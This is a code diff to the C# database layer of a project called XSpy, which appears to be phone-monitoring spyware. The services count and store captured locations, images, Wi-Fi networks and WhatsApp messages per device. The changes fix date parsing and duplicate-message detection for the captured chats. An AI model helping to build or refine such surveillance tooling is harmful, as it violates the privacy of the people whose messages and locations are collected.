@@ -44,7 +44,8 @@ namespace XSpy.Database.Services
             var locations = await DbContext.Locations.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var images = await DbContext.ImageList.Where(s => s.DeviceId == deviceId).LongCountAsync();
             var wifi = await DbContext.WifiList.Where(s => s.DeviceId == deviceId).LongCountAsync();
-            var whatsapp = await DbContext.AppMessages.Where(s => s.DeviceId == deviceId && s.AppType == AppType.WhatsApp).LongCountAsync();
+            var whatsapp = await DbContext.AppMessages
+                .Where(s => s.DeviceId == deviceId && s.AppType == AppType.WhatsApp).LongCountAsync();
 
             return new DeviceMenuViewModel()
             {
@@ -461,9 +462,16 @@ namespace XSpy.Database.Services
                         default:
                             if (date.Contains("."))
                             {
-                                day = date.Substring(0, 7);
+
+                                day = date.Remove(date.Length- 6, 6);
+
+                                if (day.Contains("de "))
+                                {
+                                    day = day.Replace("de ", null);
+                                }
                                 return DateTime.Parse(day);
                             }
+
                             var dayOfWeek = GetDayOfWeek(day);
                             return DateTime.Now.StartOfWeek(dayOfWeek);
                     }
@@ -522,7 +530,7 @@ namespace XSpy.Database.Services
                 var dateTime = DateTime.Parse(date.ToString("dd/MM/yyyy " + time.ToString("HH:mm:ss")));
 
                 if (await DbContext.AppMessages.AnyAsync(s =>
-                    s.Body == messageRequest.Message && s.MessageDate == dateTime))
+                    s.Body == messageRequest.Message && s.MessageDate == dateTime && s.IsOwn == messageRequest.IsOwn))
                     continue;
 
                 var msg = new AppMessage()
